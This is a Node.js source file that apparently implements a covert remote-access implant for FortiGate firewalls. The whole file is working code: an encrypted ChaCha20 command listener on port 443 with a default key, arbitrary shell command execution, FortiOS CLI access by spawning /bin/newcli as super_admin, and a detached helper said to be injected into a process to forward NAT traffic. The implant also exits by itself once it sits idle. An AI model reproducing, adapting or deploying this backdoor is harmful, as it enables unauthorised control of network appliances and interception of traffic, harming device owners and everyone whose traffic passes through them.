const net = require("net");
const dgram = require("dgram");
const { spawn, exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const CONFIG = {
  host: process.argv[2] || "0.0.0.0",
  port: parseInt(process.argv[3], 10) || 443,
  secret: process.argv[4] || "fortinet2026",
  timeout: 30000,
  newcliOutputTimeout: 10000, // newcli
  idleTimeout: 20000, // If there is no connection within the specified time after listening/all connections are disconnected, it will automatically exit
  readmemPath: path.join(__dirname, "readmem.js"),
  forwardStartupTimeout: 3000, // Wait for the detection process to survive after spawn readmem js
  forwardTcpPort: 80, // TCP forwarding port for readmem js daemon listening
  forwardUdpPort: 161, // The UDP forwarding port that the readmem js daemon listens on
};

/* Detect Forti OS paging prompts (such as More) */
const PAGING_PROMPT_RE = /(--More--|\bMore\b)[\s\r]*$/i;

function log(...args) {
  console.log(`[${new Date().toISOString()}]`, ...args);
}

if (CONFIG.secret === "fortinet2026") {
  log(
    "[!] Warning: using default encryption key. Use: node middle.js <host> <port> <secret>",
  );
}

/* ============== ChaCha20 ============== */
class ChaCha20 {
  constructor(key, nonce = Buffer.alloc(12), counter = 0) {
    if (key.length !== 32) throw new Error("ChaCha20 key must be 32 bytes");
    if (nonce.length !== 12) throw new Error("ChaCha20 nonce must be 12 bytes");
    this.key = key;
    this.nonce = nonce;
    this.counter = counter;
    this.block = Buffer.alloc(0);
    this.blockPos = 64;
  }

  quarterRound(s, a, b, c, d) {
    s[a] = (s[a] + s[b]) >>> 0;
    s[d] = (((s[d] ^ s[a]) << 16) | ((s[d] ^ s[a]) >>> 16)) >>> 0;
    s[c] = (s[c] + s[d]) >>> 0;
    s[b] = (((s[b] ^ s[c]) << 12) | ((s[b] ^ s[c]) >>> 20)) >>> 0;
    s[a] = (s[a] + s[b]) >>> 0;
    s[d] = (((s[d] ^ s[a]) << 8) | ((s[d] ^ s[a]) >>> 24)) >>> 0;
    s[c] = (s[c] + s[d]) >>> 0;
    s[b] = (((s[b] ^ s[c]) << 7) | ((s[b] ^ s[c]) >>> 25)) >>> 0;
  }

  generateBlock() {
    const constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    const keyWords = [];
    for (let i = 0; i < 8; i++) {
      keyWords.push(this.key.readUInt32LE(i * 4));
    }
    const nonceWords = [];
    for (let i = 0; i < 3; i++) {
      nonceWords.push(this.nonce.readUInt32LE(i * 4));
    }
    const state = constants.concat(keyWords, [this.counter >>> 0], nonceWords);
    const working = state.slice();

    for (let i = 0; i < 10; i++) {
      this.quarterRound(working, 0, 4, 8, 12);
      this.quarterRound(working, 1, 5, 9, 13);
      this.quarterRound(working, 2, 6, 10, 14);
      this.quarterRound(working, 3, 7, 11, 15);
      this.quarterRound(working, 0, 5, 10, 15);
      this.quarterRound(working, 1, 6, 11, 12);
      this.quarterRound(working, 2, 7, 8, 13);
      this.quarterRound(working, 3, 4, 9, 14);
    }

    const out = Buffer.alloc(64);
    for (let i = 0; i < 16; i++) {
      out.writeUInt32LE((working[i] + state[i]) >>> 0, i * 4);
    }
    this.counter++;
    return out;
  }

  crypt(data) {
    if (!data || data.length === 0) return data;
    const result = Buffer.alloc(data.length);
    let i = 0;
    while (i < data.length) {
      if (this.blockPos >= 64) {
        this.block = this.generateBlock();
        this.blockPos = 0;
      }
      const take = Math.min(data.length - i, 64 - this.blockPos);
      for (let j = 0; j < take; j++) {
        result[i + j] = data[i + j] ^ this.block[this.blockPos + j];
      }
      i += take;
      this.blockPos += take;
    }
    return result;
  }
}

function deriveKeys(secret) {
  const master = crypto.createHash("sha256").update(secret).digest();
  const k_cts = crypto
    .createHmac("sha256", master)
    .update("client-to-server")
    .digest();
  const k_stc = crypto
    .createHmac("sha256", master)
    .update("server-to-client")
    .digest();
  return [k_cts, k_stc];
}

function parseArgs(str) {
  const args = [];
  let cur = "",
    inQ = false,
    q = "";
  for (const ch of str) {
    if (!inQ && (ch === '"' || ch === "'")) {
      inQ = true;
      q = ch;
    } else if (inQ && ch === q) {
      inQ = false;
      q = "";
    } else if (!inQ && /\s/.test(ch)) {
      if (cur) {
        args.push(cur);
        cur = "";
      }
    } else {
      cur += ch;
    }
  }
  if (cur) args.push(cur);
  return args;
}

/* Search for executable files in PATH */
function resolveProg(prog, cb) {
  try {
    const st = fs.statSync(prog);
    if (st.isFile()) return cb(null, prog);
  } catch (e) {
    // Not a complete path, continue searching in PATH
  }
  const cmd =
    process.platform === "win32" ? `where "${prog}"` : `command -v "${prog}"`;
  exec(cmd, { windowsHide: true }, (err, stdout) => {
    if (err || !stdout.trim()) {
      return cb(new Error(`Program not found: ${prog}`));
    }
    cb(null, stdout.trim().split(/\r?\n/)[0]);
  });
}

/* Execute a single command */
function execCmd(cmdStr, cb) {
  const args = parseArgs(cmdStr);
  if (!args.length) {
    return cb({
      cmd: cmdStr,
      code: -1,
      error: "Empty command",
      stdout: "",
      stderr: "",
    });
  }

  const [prog, ...params] = args;
  log(`[EXEC] prog="${prog}" args=${JSON.stringify(params)}`);

  resolveProg(prog, (err, resolved) => {
    if (err) {
      return cb({
        cmd: cmdStr,
        code: -1,
        error: err.message,
        stdout: "",
        stderr: "",
      });
    }

    let child;
    try {
      child = spawn(resolved, params, { stdio: ["pipe", "pipe", "pipe"] });
    } catch (err) {
      return cb({
        cmd: cmdStr,
        code: -1,
        error: `spawn failed: ${err.message}`,
        stdout: "",
        stderr: "",
      });
    }

    let stdout = "",
      stderr = "";
    let finished = false;
    let killed = false;

    const timer = setTimeout(() => {
      killed = true;
      try {
        child.kill("SIGTERM");
      } catch (e) {}
      setTimeout(() => {
        try {
          child.kill("SIGKILL");
        } catch (e) {}
      }, 5000);
    }, CONFIG.timeout);

    function finish(result) {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      cb(result);
    }

    if (child.stdout) child.stdout.on("data", (d) => (stdout += d));
    if (child.stderr) child.stderr.on("data", (d) => (stderr += d));

    child.on("close", (code, signal) => {
      finish({
        cmd: cmdStr,
        code: code ?? -1,
        signal: signal || null,
        stdout,
        stderr,
        killed,
      });
    });
    child.on("error", (err) => {
      finish({ cmd: cmdStr, code: -1, error: err.message, stdout, stderr });
    });
  });
}

/* Custom Protocol Frame: Packaging */
function packFrame(cmd, ip = "", port = 0, payload = Buffer.alloc(0)) {
  const ipBuf = Buffer.from(ip, "ascii");
  const ipLen = ipBuf.length;
  const header =
    cmd +
    ipLen.toString(16).padStart(2, "0") +
    port.toString(16).padStart(4, "0") +
    payload.length.toString(16).padStart(8, "0");
  return Buffer.concat([Buffer.from(header, "ascii"), ipBuf, payload]);
}

function sendEncrypted(socket, data, cb) {
  if (!socket.destroyed && socket.writable) {
    const encrypted = socket.sendCipher.crypt(data);
    socket.write(encrypted, cb);
  } else if (cb) {
    cb();
  }
}

function sendJsonResponse(socket, obj, cb) {
  const frame = packFrame(
    "FF",
    "",
    0,
    Buffer.from(JSON.stringify(obj), "utf8"),
  );
  sendEncrypted(socket, frame, cb);
}

function sendFrame(
  socket,
  cmd,
  ip = "",
  port = 0,
  payload = Buffer.alloc(0),
  cb,
) {
  const frame = packFrame(cmd, ip, port, payload);
  sendEncrypted(socket, frame, cb);
}

/* Analyze the 16 byte ASCII hex header */
function parseHeader(buf16) {
  const s = buf16.toString("ascii");
  const cmd = s.slice(0, 2);
  const ipLen = parseInt(s.slice(2, 4), 16);
  const port = parseInt(s.slice(4, 8), 16);
  const payloadLen = parseInt(s.slice(8, 16), 16);
  if (
    s.length !== 16 ||
    !/^[0-9a-fA-F]{2}$/.test(s.slice(2, 4)) ||
    !/^[0-9a-fA-F]{4}$/.test(s.slice(4, 8)) ||
    !/^[0-9a-fA-F]{8}$/.test(s.slice(8, 16))
  ) {
    throw new Error("Invalid frame header");
  }
  if (ipLen > 256 || payloadLen > 8 * 1024 * 1024) {
    throw new Error("Frame size out of bounds");
  }
  return { cmd, ipLen, port, payloadLen };
}

/* Filter newcli output: return from the first specified prompt line */
function stripBeforePrompt(stdout, promptRegex = /FortiGate-VM64\s*#/) {
  const m = stdout.match(promptRegex);
  if (!m) return stdout;
  const lineStart = stdout.lastIndexOf("\n", m.index) + 1;
  return stdout.slice(lineStart);
}

/* Execute Forti OS CLI commands through/bin/newcli */
function execNewCli(command, cb) {
  const args = ["admin", "admin", "root", "super_admin", "root"];
  let child;
  try {
    child = spawn("/bin/newcli", args, {
      stdio: ["pipe", "pipe", "pipe"],
      detached: false,
    });
  } catch (err) {
    return cb({ code: -1, error: err.message, stdout: "", stderr: "" });
  }

  let stdout = "",
    stderr = "";
  let finished = false;
  let commandSent = false;
  let outputTimer = null;

  const globalTimer = setTimeout(() => {
    finish({ code: -1, error: "newcli execution timeout", stdout, stderr });
  }, CONFIG.timeout);

  function finish(result) {
    if (finished) return;
    finished = true;
    clearTimeout(globalTimer);
    if (outputTimer) clearTimeout(outputTimer);
    if (child && !child.killed) {
      try {
        child.kill("SIGTERM");
      } catch (e) {}
      setTimeout(() => {
        try {
          if (child && !child.killed) child.kill("SIGKILL");
        } catch (e) {}
      }, 2000);
    }
    // Clean up residual pagination prompts and ANSI color codes in the output
    if (result.stdout) {
      result.stdout = result.stdout
        .replace(/\x1b\[[0-9;]*m/g, "")
        .replace(/--More--/gi, "");
    }
    cb(result);
  }

  function safeWrite(data) {
    if (finished) return;
    try {
      if (child && !child.killed && child.stdin && child.stdin.writable) {
        child.stdin.write(data);
      }
    } catch (e) {
      // STDin write failure usually indicates that the child process has exited
    }
  }

  child.stdout.on("data", (d) => {
    if (finished) return;
    const text = d.toString();
    stdout += text;
    if (!commandSent && text.includes("#")) {
      commandSent = true;
      safeWrite(command + "\n");
      outputTimer = setTimeout(() => {
        finish({ code: 0, stdout, stderr });
      }, CONFIG.newcliOutputTimeout);
    } else if (commandSent) {
      // If there is a pagination prompt at the end of the output, press enter to continue outputting
      if (PAGING_PROMPT_RE.test(stdout)) {
        safeWrite("\n");
      }
      if (outputTimer) clearTimeout(outputTimer);
      outputTimer = setTimeout(() => {
        finish({ code: 0, stdout, stderr });
      }, CONFIG.newcliOutputTimeout);
    }
  });

  child.stderr.on("data", (d) => {
    if (!finished) stderr += d;
  });
  child.on("close", (code) => {
    finish({ code: code ?? 0, stdout, stderr });
  });
  child.on("error", (err) => {
    finish({ code: -1, error: err.message, stdout, stderr });
  });
  child.stdin.on("error", (err) => {
    //Ignore STDin errors to avoid uncaught exceptions causing server crashes
  });
}

/* ============== Mode 8: Interactive CLI Long Session ============== */

function cliSafeWrite(child, data) {
  try {
    if (child && child.stdin && child.stdin.writable && !child.killed) {
      child.stdin.write(data);
    }
  } catch (e) {}
}

function makeCliPromptRe(hostname) {
  const escaped = hostname.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return new RegExp(`^${escaped}(?:\\s*\\([^)]*\\))?\\s*#\\s*$`, "mi");
}

function cliExtractLastLine(buffer) {
  const lines = buffer.split(/\r?\n/);
  for (let i = lines.length - 1; i >= 0; i--) {
    if (lines[i].trim()) return { text: lines[i].trim(), raw: lines[i] };
  }
  return null;
}

function finishCliCommand(socket, result) {
  if (!socket.cli) return;
  socket.cli.waiting = false;
  if (socket.cli.timer) {
    clearTimeout(socket.cli.timer);
    socket.cli.timer = null;
  }
  const cb = socket.cli.callback;
  socket.cli.callback = null;
  if (cb) cb(result);
}

function checkCliBuffer(socket) {
  if (!socket.cli || !socket.cli.waiting) return;

  //Clean ANSI color codes
  socket.cli.buffer = socket.cli.buffer.replace(/\x1b\[[0-9;]*m/g, "");

  //If a pagination prompt appears at the end, press enter to continue outputting
  if (PAGING_PROMPT_RE.test(socket.cli.buffer)) {
    socket.cli.buffer = socket.cli.buffer.replace(/--More--/gi, "");
    cliSafeWrite(socket.cli.child, "\n");
  }

  const lastLine = cliExtractLastLine(socket.cli.buffer);
  if (!lastLine) return;

  if (!socket.cli.promptRe) {
    //Extract hostname from the initial prompt for subsequent matching
    const initMatch = lastLine.text.match(
      /^([^\s#]+)(?:\s*\([^)]+\))?\s*#\s*$/,
    );
    if (initMatch) {
      const hostname = initMatch[1];
      socket.cli.promptRe = makeCliPromptRe(hostname);
      const prompt = lastLine.text;
      socket.cli.buffer = "";
      finishCliCommand(socket, { prompt, output: "" });
    }
  } else if (socket.cli.promptRe.test(lastLine.text)) {
    const prompt = lastLine.text;
    const idx = socket.cli.buffer.lastIndexOf(lastLine.raw);
    let output =
      idx >= 0 ? socket.cli.buffer.slice(0, idx).trimEnd() : socket.cli.buffer;
    output = output.replace(/--More--/gi, "").trimEnd();
    socket.cli.buffer = "";
    finishCliCommand(socket, { prompt, output });
  }
}

function startCliSession(socket, client, callback) {
  if (socket.cli && socket.cli.child) {
    return callback({ error: "CLI session already active" });
  }

  let child;
  try {
    child = spawn(
      "/bin/newcli",
      ["admin", "admin", "root", "super_admin", "root"],
      {
        stdio: ["pipe", "pipe", "pipe"],
        detached: true,
      },
    );
  } catch (err) {
    return callback({ error: `spawn newcli failed: ${err.message}` });
  }

  socket.cli = {
    child,
    buffer: "",
    waiting: true,
    callback,
    timer: null,
    promptRe: null,
    closing: false,
  };

  child.stdout.on("data", (d) => {
    if (!socket.cli) return;
    socket.cli.buffer += d.toString();
    checkCliBuffer(socket);
  });

  child.stderr.on("data", (d) => {
    if (!socket.cli) return;
    socket.cli.buffer += d.toString();
    checkCliBuffer(socket);
  });

  child.on("close", (code) => {
    if (socket.cli && socket.cli.closing) {
      //Proactively closing is not considered an error
      socket.cli = null;
      return;
    }
    if (socket.cli && socket.cli.waiting && socket.cli.callback) {
      finishCliCommand(socket, {
        error: `newcli exited with code ${code}`,
        output: socket.cli.buffer || "",
        prompt: "",
      });
    }
    socket.cli = null;
  });

  child.on("error", (err) => {
    if (socket.cli && socket.cli.waiting && socket.cli.callback) {
      finishCliCommand(socket, {
        error: `newcli error: ${err.message}`,
        output: socket.cli.buffer || "",
        prompt: "",
      });
    }
    socket.cli = null;
  });

  child.stdin.on("error", (err) => {
    //Ignore STDin error
  });

  socket.cli.timer = setTimeout(() => {
    if (socket.cli && socket.cli.waiting && socket.cli.callback) {
      finishCliCommand(socket, {
        error: "timeout waiting for initial prompt",
        output: socket.cli.buffer || "",
        prompt: "",
      });
    }
  }, CONFIG.timeout);
}

function sendCliCommand(socket, command, callback) {
  if (!socket.cli || !socket.cli.child) {
    return callback({
      error: "CLI session not active",
      output: "",
      prompt: "",
    });
  }
  if (socket.cli.waiting) {
    return callback({
      error: "previous command still waiting",
      output: "",
      prompt: "",
    });
  }

  socket.cli.buffer = "";
  socket.cli.waiting = true;
  socket.cli.callback = callback;
  cliSafeWrite(socket.cli.child, command + "\n");

  socket.cli.timer = setTimeout(() => {
    if (socket.cli && socket.cli.waiting && socket.cli.callback) {
      const output = socket.cli.buffer
        .replace(/\x1b\[[0-9;]*m/g, "")
        .replace(/--More--/gi, "")
        .trimEnd();
      finishCliCommand(socket, {
        error: "timeout waiting for prompt",
        output,
        prompt: "",
      });
    }
  }, CONFIG.newcliOutputTimeout);
}

function closeCliSession(socket, callback) {
  if (socket.cli && socket.cli.child) {
    socket.cli.closing = true;
    //Try exiting gracefully first
    cliSafeWrite(socket.cli.child, "exit\n");
    //If it still hasn't exited after 1 second, force SIGTERM
    setTimeout(() => {
      if (socket.cli && socket.cli.child && !socket.cli.child.killed) {
        try {
          socket.cli.child.kill("SIGTERM");
        } catch (e) {}
      }
    }, 1000);
  } else {
    socket.cli = null;
  }
  if (callback) callback({ done: true });
}

function handleCliStart(socket, client, ip, port, payload) {
  log(`[CLI START] ${client}`);
  startCliSession(socket, client, (result) => {
    if (result.error) log(`[CLI ERROR] ${client}: ${result.error}`);
    sendJsonResponse(socket, { mode: "cli", ...result });
  });
}

function handleCliCommand(socket, client, ip, port, payload) {
  const command = payload.toString("utf8").trim();
  log(`[CLI CMD] ${client} => ${command}`);
  sendCliCommand(socket, command, (result) => {
    if (result.error) log(`[CLI ERROR] ${client}: ${result.error}`);
    sendJsonResponse(socket, { mode: "cli", ...result });
  });
}

function handleCliEnd(socket, client, ip, port, payload) {
  log(`[CLI END] ${client}`);
  closeCliSession(socket, (result) => {
    sendJsonResponse(socket, { mode: "cli", ...result });
  });
}

/* ============== NAT forwarding control（spawn readmem.js -nat） ============== */

/**
 *Scan/doc to check if there is already a NAT forwarding process running
 *Matching rules (consistent with clear js):
 *CMDline includes/bin/node and nat server (daemon daemon)
 *CMDline includes/bin/node, nat, and vdom/dip/dport (injected into the main process)
 * @returns {boolean} If there is already a forwarding process running, return true
 */
function isForwardRunning() {
  const procDir = "/proc";
  const currentPid = process.pid;
  let pids;
  try {
    pids = fs.readdirSync(procDir).filter((name) => /^\d+$/.test(name));
  } catch (err) {
    log(`[NAT] read /proc failed: ${err.message}`);
    return false;
  }

  for (const pidStr of pids) {
    const pid = parseInt(pidStr, 10);
    if (pid === currentPid) continue;
    const cmdlinePath = path.join(procDir, pidStr, "cmdline");
    try {
      const cmdline = fs.readFileSync(cmdlinePath, "utf8");
      const fullCmd = cmdline.replace(/\0/g, " ");
      if (
        (fullCmd.includes("/bin/node") && fullCmd.includes("-natServer")) ||
        (fullCmd.includes("/bin/node") &&
          fullCmd.includes("-nat") &&
          fullCmd.includes("--vdom") &&
          fullCmd.includes("--dip") &&
          fullCmd.includes("--dport"))
      ) {
        return true;
      }
    } catch (err) {
      //The process may have exited, ignore
    }
  }
  return false;
}

/**
 *Start NAT forwarding: spawn readmem js nat vdom X dip X dport X
 *The process starts in detached mode, and exiting the server JS does not affect the forwarding process
 */
function startForward(params, cb) {
  const { vdom, dip, dport } = params;
  if (!vdom || !dip || !dport) {
    return cb({ error: "missing parameter: vdom/dip/dport required" });
  }

  // Check if there is already a forwarding process running
  if (isForwardRunning()) {
    log(`[NAT] forward already running, reject start request`);
    return cb({
      error:
        "NAT forwarding has been enabled, please clear forward before configuring",
    });
  }

  log(`[NAT] starting: vdom=${vdom} dip=${dip} dport=${dport}`);
  let child;
  try {
    child = spawn(
      "/bin/node",
      [
        CONFIG.readmemPath,
        "-nat",
        "--vdom",
        vdom,
        "--dip",
        dip,
        "--dport",
        dport,
      ],
      { detached: true, stdio: "ignore" },
    );
    child.unref();
  } catch (err) {
    log(`[NAT] spawn failed: ${err.message}`);
    return cb({ error: `spawn readmem.js failed: ${err.message}` });
  }

  // Wait for a period of time to check if the process is still alive
  setTimeout(() => {
    const running = isForwardRunning();
    if (running) {
      log(`[NAT] forward started successfully`);
      cb({
        status: "started",
        vdom,
        dip,
        dport,
        listen_tcp: CONFIG.forwardTcpPort,
        listen_udp: CONFIG.forwardUdpPort,
      });
    } else {
      log(`[NAT] forward start failed (process not running)`);
      cb({
        error:
          "Startup failed, please check if the parameters or readmem js exist",
      });
    }
  }, CONFIG.forwardStartupTimeout);
}

/**
 * Clear forwarding process: kill -nat main process and -natServer daemon process
 * Logic reference clear.js
 */
function clearForward(cb) {
  const procDir = "/proc";
  const currentPid = process.pid;
  let killed = 0;
  const killedPids = [];
  let pids;
  try {
    pids = fs.readdirSync(procDir).filter((name) => /^\d+$/.test(name));
  } catch (err) {
    log(`[NAT] read /proc failed: ${err.message}`);
    return cb({ error: `read /proc failed: ${err.message}` });
  }

  for (const pidStr of pids) {
    const pid = parseInt(pidStr, 10);
    if (pid === currentPid) continue;
    const cmdlinePath = path.join(procDir, pidStr, "cmdline");
    try {
      const cmdline = fs.readFileSync(cmdlinePath, "utf8");
      const fullCmd = cmdline.replace(/\0/g, " ");

      const isNatServer =
        fullCmd.includes("/bin/node") && fullCmd.includes("-natServer");
      const isNatMain =
        fullCmd.includes("/bin/node") &&
        fullCmd.includes("-nat") &&
        fullCmd.includes("--vdom") &&
        fullCmd.includes("--dip") &&
        fullCmd.includes("--dport");

      if (isNatServer || isNatMain) {
        try {
          process.kill(pid, "SIGTERM");
          killed++;
          killedPids.push(pid);
          log(`[NAT] killed process ${pid}`);
        } catch (err) {
          log(`[NAT] kill ${pid} failed: ${err.message}`);
        }
      }
    } catch (err) {
      // The process may have exited, ignore
    }
  }

  log(`[NAT] clear done, total killed: ${killed}`);
  cb({ status: "cleared", killed, pids: killedPids });
}

/* Mode 10: Activate NAT forwarding */
function handleNatStart(socket, client, ip, port, payload) {
  let params;
  try {
    params = JSON.parse(payload.toString("utf8"));
  } catch (e) {
    return sendJsonResponse(socket, {
      mode: "nat",
      error: `invalid JSON params: ${e.message}`,
    });
  }
  log(`[NAT START] ${client} params=${JSON.stringify(params)}`);
  startForward(params, (result) => {
    sendJsonResponse(socket, { mode: "nat", ...result });
  });
}

/* Mode 11: Clear NAT forwarding */
function handleNatClear(socket, client, ip, port, payload) {
  log(`[NAT CLEAR] ${client}`);
  clearForward((result) => {
    sendJsonResponse(socket, { mode: "nat", ...result });
  });
}

/* Mode 12: Query NAT forwarding status */
function handleNatStatus(socket, client, ip, port, payload) {
  const running = isForwardRunning();
  log(`[NAT STATUS] ${client} running=${running}`);
  sendJsonResponse(socket, {
    mode: "nat",
    status: running ? "running" : "idle",
    running,
  });
}

/* Mode 1: SHELL */
function handleShell(socket, client, ip, port, payload) {
  const cmdStr = payload.toString("utf8");
  log(`[SHELL] ${client} => ${cmdStr}`);
  execCmd(cmdStr, (result) => {
    log(`[RESULT] code=${result.code} cmd="${result.cmd}"`);
    if (result.stdout) log(`[STDOUT]\n${result.stdout}`);
    if (result.stderr) log(`[STDERR]\n${result.stderr}`);
    if (result.error) log(`[ERROR] ${result.error}`);
    sendJsonResponse(socket, result);
  });
}

/* Mode 7: INFO - Get interface information */
function handleInfo(socket, client, ip, port, payload) {
  log(`[INFO] ${client} => show system interface`);
  const command = `config global\nshow system interface\nend\nexit\n`;
  execNewCli(command, (result) => {
    if (result.stdout) log(`[INFO STDOUT]\n${result.stdout}`);
    if (result.stderr) log(`[INFO STDERR]\n${result.stderr}`);
    if (result.error) log(`[INFO ERROR] ${result.error}`);
    sendJsonResponse(socket, { mode: "info", ...result });
  });
}

/* Mode 2: PING (supports direct ping or specified VDOM) */
function handlePing(socket, client, ip, port, payload) {
  if (!ip) {
    return sendJsonResponse(socket, { mode: "ping", error: "missing target" });
  }
  const vdom = payload.toString("utf8").trim();

  if (vdom) {
    // Execute ping within the specified VDOM via newcli
    const command = `config vdom\nedit "${vdom}"\nexecute ping ${ip}\nend\nexit\n`;
    log(`[PING/VDOM] ${client} vdom=${vdom} target=${ip}`);
    execNewCli(command, (result) => {
      if (result.stdout) log(`[PING/VDOM STDOUT]\n${result.stdout}`);
      if (result.stderr) log(`[PING/VDOM STDERR]\n${result.stderr}`);
      if (result.error) log(`[PING/VDOM ERROR] ${result.error}`);
      // The client only retains content starting from the Forti Gate prompt
      if (result.stdout) result.stdout = stripBeforePrompt(result.stdout);
      sendJsonResponse(socket, {
        mode: "ping",
        cmd: `ping ${vdom} ${ip}`,
        ...result,
      });
    });
    return;
  }

  // system ping
  const pingArgs =
    process.platform === "win32" ? ["-n", "4", ip] : ["-c", "4", ip];
  resolveProg("ping", (err, prog) => {
    if (err) {
      return sendJsonResponse(socket, { mode: "ping", error: err.message });
    }
    log(`[PING] ${client} -> ${ip}`);
    let child;
    try {
      child = spawn(prog, pingArgs, { stdio: ["pipe", "pipe", "pipe"] });
    } catch (err) {
      return sendJsonResponse(socket, { mode: "ping", error: err.message });
    }
    let stdout = "",
      stderr = "";
    if (child.stdout) child.stdout.on("data", (d) => (stdout += d));
    if (child.stderr) child.stderr.on("data", (d) => (stderr += d));
    child.on("close", (code) => {
      sendJsonResponse(socket, {
        mode: "ping",
        cmd: `ping ${ip}`,
        code,
        stdout,
        stderr,
      });
    });
    child.on("error", (err) => {
      sendJsonResponse(socket, { mode: "ping", error: err.message });
    });
  });
}

function handleFrame(socket, client, cmd, ip, port, payload) {
  log(
    `[FRAME] ${client} cmd=${cmd} ip=${ip} port=${port} payload_len=${payload.length}`,
  );
  switch (cmd) {
    case "00":
      // Handshake response: Return the client's nonce as it is
      sendFrame(socket, "00", "", 0, payload);
      break;
    case "01":
      handleShell(socket, client, ip, port, payload);
      break;
    case "02":
      handlePing(socket, client, ip, port, payload);
      break;
    case "07":
      handleInfo(socket, client, ip, port, payload);
      break;
    case "09":
      handleCliStart(socket, client, ip, port, payload);
      break;
    case "0A":
      handleCliCommand(socket, client, ip, port, payload);
      break;
    case "0B":
      handleCliEnd(socket, client, ip, port, payload);
      break;
    case "10":
      handleNatStart(socket, client, ip, port, payload);
      break;
    case "11":
      handleNatClear(socket, client, ip, port, payload);
      break;
    case "12":
      handleNatStatus(socket, client, ip, port, payload);
      break;
    case "05":
      log(`[QUIT] ${client} requested disconnect`);
      sendJsonResponse(socket, { mode: "quit", message: "Bye" }, () =>
        socket.end(),
      );
      break;
    default:
      sendJsonResponse(socket, {
        mode: "unknown",
        error: `unknown cmd: ${cmd}`,
      });
  }
}

let idleTimer = null;
let activeConnections = 0;

function startIdleTimer() {
  if (idleTimer) clearTimeout(idleTimer);
  idleTimer = setTimeout(() => {
    if (activeConnections === 0) {
      log(
        `[!] Idle timeout (${CONFIG.idleTimeout}ms), no active connection. Exiting.`,
      );
      server.close(() => process.exit(0));
    } else {
      startIdleTimer();
    }
  }, CONFIG.idleTimeout);
}

function clearIdleTimer() {
  if (idleTimer) {
    clearTimeout(idleTimer);
    idleTimer = null;
  }
}

/* TCP Server */
const server = net.createServer((socket) => {
  const client = `${socket.remoteAddress}:${socket.remotePort}`;

  // Initialize sending and receiving Cha Cha20 cipher: server-side receiving=cts, sending=stc
  const [kRecv, kSend] = deriveKeys(CONFIG.secret);
  socket.recvCipher = new ChaCha20(kRecv);
  socket.sendCipher = new ChaCha20(kSend);

  socket.parseState = "header";
  socket.buf = Buffer.alloc(0);
  socket.frame = null;
  log(`[+] CONNECTED: ${client}`);

  // Stop idle timeout exit as long as a connection is established
  activeConnections++;
  clearIdleTimer();

  socket.on("data", (data) => {
    if (socket.destroyed) return;

    // Decrypt first, then parse in frame format
    const decrypted = socket.recvCipher.crypt(data);
    socket.buf = Buffer.concat([socket.buf, decrypted]);

    while (true) {
      if (socket.parseState === "header") {
        if (socket.buf.length < 16) break;
        try {
          socket.frame = parseHeader(socket.buf.slice(0, 16));
        } catch (e) {
          log(`[!] Bad frame header from ${client}: ${e.message}`);
          socket.destroy();
          break;
        }
        socket.buf = socket.buf.slice(16);
        socket.parseState = "body";
      }

      if (socket.parseState === "body") {
        const need = socket.frame.ipLen + socket.frame.payloadLen;
        if (socket.buf.length < need) break;
        const ip = socket.buf.slice(0, socket.frame.ipLen).toString("ascii");
        const payload = socket.buf.slice(socket.frame.ipLen, need);
        socket.buf = socket.buf.slice(need);
        socket.parseState = "header";

        handleFrame(
          socket,
          client,
          socket.frame.cmd,
          ip,
          socket.frame.port,
          payload,
        );
      }
    }
  });

  socket.on("close", () => {
    closeCliSession(socket, () => {});
    activeConnections--;
    if (activeConnections <= 0) {
      activeConnections = 0;
      startIdleTimer();
    }
    log(`[-] DISCONNECTED: ${client}`);
  });
  socket.on("error", (err) =>
    log(`[!] SOCKET ERROR ${client}: ${err.message}`),
  );
});

server.listen(CONFIG.port, CONFIG.host, () => {
  log(`[*] Server listening on ${CONFIG.host}:${CONFIG.port}`);
  startIdleTimer();
});
